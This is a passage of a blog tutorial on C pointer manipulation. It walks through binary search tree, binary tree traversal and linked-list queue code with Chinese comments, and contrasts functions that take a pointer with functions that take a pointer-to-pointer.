class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*中序遍历打印树节点*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bstree_inorder_node</span><span class="params">(bstree_node *root)</span></span><br><span class="line">&#123;</span><br><span class="line">	bstree_node *node = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	bstree_inorder_node(root-&gt;lchild);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot; %d &quot;</span>,root-&gt;data);</span><br><span class="line">	bstree_inorder_node(root-&gt;rchild);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bstree_dump</span><span class="params">(bstree *tree)</span></span><br><span class="line">&#123;</span><br><span class="line">	bstree_node *node = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> ((tree == <span class="literal">NULL</span>) || (bstree_is_empty(tree)))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\r\n 当前树是空树&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\r\nSTART-----------------%d------------\r\n&quot;</span>,tree-&gt;size);</span><br><span class="line">	bstree_inorder_node(tree-&gt;root);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\r\nEND---------------------------------&quot;</span>,tree-&gt;size);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">bstree_compare</span><span class="params">(mytype key1,mytype key2)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (key1 == key2)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (key1 &gt; key2)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	bstree *tree = <span class="literal">NULL</span>;</span><br><span class="line">	bstree_node *node = <span class="literal">NULL</span>;</span><br><span class="line">	mytype data = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	setenv(<span class="string">&quot;MALLOC_TRACE&quot;</span>,<span class="string">&quot;1.txt&quot;</span>,<span class="number">1</span>);</span><br><span class="line">    mtrace();</span><br><span class="line"></span><br><span class="line">	tree = bstree_create(bstree_compare,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;first address: %d&quot;</span>, tree);</span><br><span class="line">	assert(tree != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\r\n插入一个数字，输入100时退出：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;data);</span><br><span class="line">		<span class="keyword">if</span>(data == <span class="number">100</span>)<span class="keyword">break</span>;</span><br><span class="line">		res = bstree_insert(tree,data);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\r\n %d 插入%s成功&quot;</span>,data,(res != <span class="number">0</span>)?(<span class="string">&quot;不&quot;</span>):(<span class="string">&quot; &quot;</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	bstree_dump(tree);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\r\n查询一个数字，输入100时退出：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;data);</span><br><span class="line">		<span class="keyword">if</span>(data == <span class="number">100</span>)<span class="keyword">break</span>;</span><br><span class="line">		node = bstree_search(tree,data);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\r\n %d %s存在树中&quot;</span>,data,(node == <span class="literal">NULL</span>)?(<span class="string">&quot;不&quot;</span>):(<span class="string">&quot; &quot;</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	bstree_dump(tree);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\r\n删除一个数字，输入100时退出：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;data);</span><br><span class="line">		<span class="keyword">if</span>(data == <span class="number">100</span>)<span class="keyword">break</span>;</span><br><span class="line">		res = bstree_delete(tree,data);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\r\n %d 删除%s成功&quot;</span>,data,(res != <span class="number">0</span>)?(<span class="string">&quot;不&quot;</span>):(<span class="string">&quot; &quot;</span>));</span><br><span class="line">	    bstree_dump(tree);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	bstree_destory(tree);</span><br><span class="line"></span><br><span class="line">    muntrace();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Now let’s focus on the first while loop among the <em>main()</em> block. In this case, the pointer <em>tree</em> was directly passed into the function <em>bstree_insert</em>, it’s kind of odd compared with the previous instances. The difference is that the pointer <em>tree</em> has been allocated memory before passed as an argument. </p>
<img src="/2019/02/12/Pointer-Manipulations-That-Should-Be-Noted/pic_3.png" width="100%" height="100%">

<p>There are actually two pointers which belong to two different address in the memory, but both of them point to the same space. If we change the value of the space one pointer points to, we simultaneously change the value that the other pointer points to. If the extreme performance is what you want, The function <em>bstree_insert</em> can be correctly replaced by <em>bstree_insert2</em> as below. This conversion can save the time of memory allocation.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">bstree_insert2</span><span class="params">(bstree ** tree, mytype data)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;second address: %d&quot;</span>, *tree);</span><br><span class="line">    bstree_node *node = <span class="literal">NULL</span>;</span><br><span class="line">    bstree_node *tmp = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (tree == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	node = (bstree_node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(bstree_node));</span><br><span class="line">	<span class="keyword">if</span> (node == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	node-&gt;data = data;</span><br><span class="line">	node-&gt;lchild = <span class="literal">NULL</span>;</span><br><span class="line">	node-&gt;rchild = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*如果二叉树为空，直接挂到根节点*/</span></span><br><span class="line">	<span class="keyword">if</span> (bstree_is_empty((*tree)))</span><br><span class="line">	&#123;</span><br><span class="line">        (*tree)-&gt;root = node;</span><br><span class="line">		(*tree)-&gt;size++;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	tmp = (*tree)-&gt;root;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(tmp != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		res = (*tree)-&gt;compare(data,tmp-&gt;data);</span><br><span class="line">		<span class="keyword">if</span> (res &gt; <span class="number">0</span>) <span class="comment">/*去右孩子查找*/</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (tmp-&gt;rchild == <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				tmp-&gt;rchild = node;</span><br><span class="line">				(*tree)-&gt;size++;</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		    tmp = tmp-&gt;rchild;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="comment">/*去左孩子查找*/</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(tmp-&gt;lchild == <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				tmp-&gt;lchild = node;</span><br><span class="line">				(*tree)-&gt;size++;</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			tmp = tmp-&gt;lchild;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">return</span> <span class="number">-3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Then modify the <em>main()</em> code:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">res = bstree_insert2(&amp;tree,data);</span><br></pre></td></tr></table></figure>
<p>One last instance that we should focus on, there is an implement of a binary tree:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//binarytree.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;list_queue.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">treenode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">int</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">treenode</span> *<span class="title">lchild</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">treenode</span> *<span class="title">rchild</span>;</span></span><br><span class="line">&#125;Tnode,Tree;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">binarytree_create</span><span class="params">(Tree **Root)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\r\n输入节点数值((当输入为100时，当前节点创建完成))):&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (a == <span class="number">100</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		*Root = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		*Root = (Tnode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Tnode));</span><br><span class="line">		<span class="keyword">if</span> (*Root == <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		(*Root)-&gt;data = a;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\r\n create %d 的左孩子:&quot;</span>,a);</span><br><span class="line">		binarytree_create(&amp;((*Root)-&gt;lchild));</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\r\n create %d 的右孩子:&quot;</span>,a);</span><br><span class="line">		binarytree_create(&amp;((*Root)-&gt;rchild));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">binarytree_destory</span><span class="params">(Tree *root)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	binarytree_destory(root-&gt;lchild);</span><br><span class="line">	binarytree_destory(root-&gt;rchild);</span><br><span class="line">	<span class="built_in">free</span>(root);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*先序遍历:根结点--》左子树---》右子树*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">binarytree_preorder</span><span class="params">(Tree *root)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot; %d &quot;</span>,root-&gt;data);</span><br><span class="line">	binarytree_preorder(root-&gt;lchild);</span><br><span class="line">	binarytree_preorder(root-&gt;rchild);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*中序遍历:左子树--》跟节点---》右子树*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">binarytree_inorder</span><span class="params">(Tree *root)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	binarytree_inorder(root-&gt;lchild);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot; %d &quot;</span>,root-&gt;data);</span><br><span class="line">	binarytree_inorder(root-&gt;rchild);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*后序遍历:左子树---》右子树-》根节点*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">binarytree_postorder</span><span class="params">(Tree *root)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	binarytree_postorder(root-&gt;lchild);</span><br><span class="line">	binarytree_postorder(root-&gt;rchild);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot; %d &quot;</span>,root-&gt;data);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">binarytree_levelorder</span><span class="params">(Tree * root)</span></span><br><span class="line">&#123;</span><br><span class="line">	list_queue *<span class="built_in">queue</span> = <span class="literal">NULL</span>;</span><br><span class="line">	Tnode * node = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(root == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">queue</span> = list_queue_create();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*根节点先入队*/</span></span><br><span class="line">	list_queue_enqueue(<span class="built_in">queue</span>,(<span class="type">void</span> *)root);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(!list_queue_is_empty(<span class="built_in">queue</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		list_queue_dequeue(<span class="built_in">queue</span>,(<span class="type">void</span> *)&amp;node);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot; %d &quot;</span>,node-&gt;data);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(node-&gt;lchild != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			list_queue_enqueue(<span class="built_in">queue</span>,(<span class="type">void</span> *)node-&gt;lchild);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(node-&gt;rchild != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			list_queue_enqueue(<span class="built_in">queue</span>,(<span class="type">void</span> *)node-&gt;rchild);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(<span class="built_in">queue</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*打印叶子节点*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">binarytree_printfleaf</span><span class="params">(Tree *root)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((root-&gt;lchild == <span class="literal">NULL</span>) &amp;&amp; (root-&gt;rchild == <span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot; %d &quot;</span>,root-&gt;data);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		binarytree_printfleaf(root-&gt;lchild);</span><br><span class="line">		binarytree_printfleaf(root-&gt;rchild);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*打印叶子的个数*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">binarytree_getleafnum</span><span class="params">(Tree*root)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((root-&gt;lchild == <span class="literal">NULL</span>) &amp;&amp; (root-&gt;rchild == <span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> binarytree_getleafnum(root-&gt;lchild) + binarytree_getleafnum(root-&gt;rchild);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*打印数的高度*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">binarytree_gethigh</span><span class="params">(Tree *root)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> lhigh = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> rhigh = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	lhigh = binarytree_gethigh(root-&gt;lchild);</span><br><span class="line">	rhigh = binarytree_gethigh(root-&gt;rchild);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ((lhigh &gt; rhigh)?(lhigh + <span class="number">1</span>):(rhigh + <span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	Tree *root = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	setenv(<span class="string">&quot;MALLOC_TRACE&quot;</span>,<span class="string">&quot;1.txt&quot;</span>,<span class="number">1</span>);</span><br><span class="line">    mtrace();</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\r\n创建二叉树:&quot;</span>);</span><br><span class="line">	binarytree_create(&amp;root);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\r\n先序遍历二叉树:&quot;</span>);</span><br><span class="line">	binarytree_preorder(root);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\r\n中序遍历二叉树:&quot;</span>);</span><br><span class="line">	binarytree_inorder(root);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\r\n后序遍历二叉树:&quot;</span>);</span><br><span class="line">	binarytree_postorder(root);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\r\n层次遍历二叉树:&quot;</span>);</span><br><span class="line">	binarytree_levelorder(root);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\r\n打印二叉树叶子节点:&quot;</span>);</span><br><span class="line">	binarytree_printfleaf(root);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\r\n打印二叉树叶子节点个数:%d&quot;</span>,binarytree_getleafnum(root));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\r\n打印二叉树高度:%d&quot;</span>,binarytree_gethigh(root));</span><br><span class="line"></span><br><span class="line">	binarytree_destory(root);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//list_queue.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LINK_LIST_QUEUE_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LINK_LIST_QUEUE_H</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">list_queue_node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">void</span> *data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">list_queue_node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;queue_node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">list_queue</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">int</span> num;</span><br><span class="line">	queue_node *head;</span><br><span class="line">	queue_node *tail;</span><br><span class="line">&#125;list_queue;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> list_queue_is_empty(queue) ((queue-&gt;num) == 0)</span></span><br><span class="line">list_queue *<span class="title function_">list_queue_create</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">list_queue_enqueue</span><span class="params">(list_queue *<span class="built_in">queue</span>,<span class="type">void</span> *data)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">list_queue_dequeue</span><span class="params">(list_queue *<span class="built_in">queue</span>,<span class="type">void</span> **data)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//list_queue.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;./list_queue.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*创建队列头*/</span></span><br><span class="line">list_queue *<span class="title function_">list_queue_create</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	list_queue * <span class="built_in">queue</span> = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">queue</span> = (list_queue *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(list_queue));</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">queue</span> == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">queue</span>-&gt;num  = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">queue</span>-&gt;head = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">queue</span>-&gt;tail = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">queue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">list_queue_enqueue</span><span class="params">(list_queue *<span class="built_in">queue</span>,<span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">	queue_node *ptmp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">queue</span> == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ptmp = (queue_node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(queue_node));</span><br><span class="line">	<span class="keyword">if</span> (ptmp == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ptmp-&gt;data = data;</span><br><span class="line">	ptmp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">queue</span>-&gt;head == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">queue</span>-&gt;head = ptmp;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	    <span class="built_in">queue</span>-&gt;tail-&gt;next = ptmp;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">queue</span>-&gt;tail = ptmp;</span><br><span class="line">	<span class="built_in">queue</span>-&gt;num++;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*出队*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">list_queue_dequeue</span><span class="params">(list_queue *<span class="built_in">queue</span>,<span class="type">void</span> **data)</span></span><br><span class="line">&#123;</span><br><span class="line">	queue_node * ptmp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((<span class="built_in">queue</span> == <span class="literal">NULL</span>) || (data == <span class="literal">NULL</span>) || list_queue_is_empty(<span class="built_in">queue</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	*data = <span class="built_in">queue</span>-&gt;head-&gt;data;</span><br><span class="line">    ptmp = <span class="built_in">queue</span>-&gt;head;</span><br><span class="line">	<span class="built_in">queue</span>-&gt;head = <span class="built_in">queue</span>-&gt;head-&gt;next;</span><br><span class="line">	<span class="built_in">queue</span>-&gt;num--;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">queue</span>-&gt;head == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">queue</span>-&gt;tail = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">free</span>(ptmp);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Let’s review the code of <em>binarytree.c</em> and replace the function <em>binarytree_create</em> by <em>binarytree_create2</em>:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">binarytree_create2</span><span class="params">(Tree *Root)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\r\n输入节点数值((当输入为100时，当前节点创建完成))):&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (a == <span class="number">100</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		Root = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		Root = (Tnode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Tnode));</span><br><span class="line">		<span class="keyword">if</span> (Root == <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		Root-&gt;data = a;</span><br><span 